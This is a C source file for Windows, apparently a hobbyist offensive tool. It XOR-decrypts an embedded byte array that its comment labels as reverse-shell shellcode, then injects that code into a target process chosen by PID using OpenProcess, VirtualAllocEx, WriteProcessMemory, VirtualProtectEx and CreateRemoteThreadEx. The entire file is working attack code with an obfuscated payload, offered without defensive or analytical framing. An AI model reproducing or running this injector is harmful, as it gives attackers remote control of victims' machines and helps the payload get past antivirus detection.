#include <stdio.h>
#include <string.h>
#include <windows.h>

// OpenProcess([in] DWORD dwDesiredAccess, [in] BOOL  bInheritHandle, [in] DWORD dwProcessId)
// VirtualAllocEx([in] HANDLE hProcess, [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD  flAllocationType, [in]  DWORD  flProtect)
// WriteProcessMemory( [in]  HANDLE  hProcess,[in] LPVOID lpBaseAddress,[in] LPCVOID lpBuffer, [in] SIZE_T  nSize, [out] SIZE_T  *lpNumberOfBytesWritten)
// CreateRemoteThreadEx()

unsigned char code[] =  // Xor Encypted Shellcode For Reverse Shell
"\x8c\x38\xf3\x94\x80\x98\xbc\x70\x70\x70\x31\x21\x31\x20\x22\x38"
"\x41\xa2\x21\x15\x38\xfb\x22\x10\x26\x38\xfb\x22\x68\x38\xfb\x22"
"\x50\x3d\x41\xb9\x38\x7f\xc7\x3a\x3a\x38\xfb\x02\x20\x38\x41\xb0"
"\xdc\x4c\x11\x0c\x72\x5c\x50\x31\xb1\xb9\x7d\x31\x71\xb1\x92\x9d"
"\x22\x31\x21\x38\xfb\x22\x50\xfb\x32\x4c\x38\x71\xa0\x16\xf1\x08"
"\x68\x7b\x72\x7f\xf5\x02\x70\x70\x70\xfb\xf0\xf8\x70\x70\x70\x38"
"\xf5\xb0\x04\x17\x38\x71\xa0\x34\xfb\x30\x50\xfb\x38\x68\x39\x71"
"\xa0\x20\x93\x26\x3d\x41\xb9\x38\x8f\xb9\x31\xfb\x44\xf8\x38\x71"
"\xa6\x38\x41\xb0\xdc\x31\xb1\xb9\x7d\x31\x71\xb1\x48\x90\x05\x81"
"\x3c\x73\x3c\x54\x78\x35\x49\xa1\x05\xa8\x28\x34\xfb\x30\x54\x39"
"\x71\xa0\x16\x31\xfb\x7c\x38\x34\xfb\x30\x6c\x39\x71\xa0\x31\xfb"
"\x74\xf8\x31\x28\x38\x71\xa0\x31\x28\x2e\x29\x2a\x31\x28\x31\x29"
"\x31\x2a\x38\xf3\x9c\x50\x31\x22\x8f\x90\x28\x31\x29\x2a\x38\xfb"
"\x62\x99\x3b\x8f\x8f\x8f\x2d\x39\xce\x07\x03\x42\x2f\x43\x42\x70"
"\x70\x31\x26\x39\xf9\x96\x38\xf1\x9c\xd0\x71\x70\x70\x39\xf9\x95"
"\x39\xcc\x72\x70\x71\xcb\xb0\xd8\x71\x6e\x31\x24\x39\xf9\x94\x3c"
"\xf9\x81\x31\xca\x3c\x07\x56\x77\x8f\xa5\x3c\xf9\x9a\x18\x71\x71"
"\x70\x70\x29\x31\xca\x59\xf0\x1b\x70\x8f\xa5\x1a\x7a\x31\x2e\x20"
"\x20\x3d\x41\xb9\x3d\x41\xb0\x38\x8f\xb0\x38\xf9\xb2\x38\x8f\xb0"
"\x38\xf9\xb1\x31\xca\x9a\x7f\xaf\x90\x8f\xa5\x38\xf9\xb7\x1a\x60"
"\x31\x28\x3c\xf9\x92\x38\xf9\x89\x31\xca\xe9\xd5\x04\x11\x8f\xa5"
"\xf5\xb0\x04\x7a\x39\x8f\xbe\x05\x95\x98\xe3\x70\x70\x70\x38\xf3"
"\x9c\x60\x38\xf9\x92\x3d\x41\xb9\x1a\x74\x31\x28\x38\xf9\x89\x31"
"\xca\x72\xa9\xb8\x2f\x8f\xa5\xf3\x88\x70\x0e\x25\x38\xf3\xb4\x50"
"\x2e\xf9\x86\x1a\x30\x31\x29\x18\x70\x60\x70\x70\x31\x28\x38\xf9"
"\x82\x38\x41\xb9\x31\xca\x28\xd4\x23\x95\x8f\xa5\x38\xf9\xb3\x39"
"\xf9\xb7\x3d\x41\xb9\x39\xf9\x80\x38\xf9\xaa\x38\xf9\x89\x31\xca"
"\x72\xa9\xb8\x2f\x8f\xa5\xf3\x88\x70\x0d\x58\x28\x31\x27\x29\x18"
"\x70\x30\x70\x70\x31\x28\x1a\x70\x2a\x31\xca\x7b\x5f\x7f\x40\x8f"
"\xa5\x27\x29\x31\xca\x05\x1e\x3d\x11\x8f\xa5\x39\x8f\xbe\x99\x4c"
"\x8f\x8f\x8f\x38\x71\xb3\x38\x59\xb6\x38\xf5\x86\x05\xc4\x31\x8f"
"\x97\x28\x1a\x70\x29\x39\xb7\xb2\x80\xc5\xd2\x26\x8f\xa5\x70";                                                                                                                                                                                                                                     



int main(int argc, char* argv[]) {
    PVOID rBuffer = NULL; // Pointer to Where our buffer to write got allocated
    HANDLE hProcess = NULL, hThread = NULL; // Pointer to Proccess We Attach Too And Our Thread
    DWORD pID = 0, tID = 0; // Variables To Hold ThreadID and ProcessID
    char key = 'p'; // Key For Decrypting ShellCode
    

    size_t code_len = sizeof(code); // Get Shell Code Length
    pID = atoi(argv[1]); // Convert pID From Ascii to INT
    int i = 0;

    for (i; i < code_len; i++) {
        code[i] = code[i] ^ key; // Loop Through ShellCode byte-by-byte XORing It to get original ShellCode
    }

    printf("[+] Attempting To Get Handle To Process: %ld\n", pID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID); // Get Handle To Process

    if (hProcess == NULL) { // If Handle Still == NULL, We Failed
        printf("[-] Failed Getting Handle\n[-] Error Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[*] Succesfully Got a Handle To Process\n\\_______%p\n\n", hProcess);

    printf("[+] Attempting To Allocate %d-Bytes To Process\n", code_len);

    rBuffer = VirtualAllocEx(hProcess, NULL, code_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); // Allocate a Region In Processes Memory Where we can put shell code, With RW Perms

    if (rBuffer == NULL) {
        printf("[-] Failed Allocating %d-Bytes\n[-] Error Code: 0x%ld\n", code_len, GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] Attempting To Write ShellCode To Process\n");
    

    WriteProcessMemory(hProcess, rBuffer, code, code_len, NULL); // Write Our ShellCode to the Region We Allocated

    DWORD OldProtect;

    if (!VirtualProtectEx(hProcess, rBuffer, code_len, PAGE_EXECUTE_READ, &OldProtect)) { // Change Permissions To RX, Appartly Safer
        printf("[-] Failed Setting New Permissions!\n[-] Error Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[*] Succesfully Wrote %d-Bytes To Process\n", code_len);

    printf("[+] Creating Thread\n");

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &tID); // Start a Thread To Run Our ShellCode

    if (hThread == NULL) {
        printf("[-] Failed Creating Thread\n[-] Error Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[*] Created Thread, Starting Now!\n");

    WaitForSingleObject(hThread, INFINITE); // Wait For Thread To Finish Before Cleaning up
    printf("[*] Finished Executing, Cleaning Up\n");

    CloseHandle(hThread);
                            // Close Handle And Thread
    CloseHandle(hProcess);


    return EXIT_SUCCESS;


}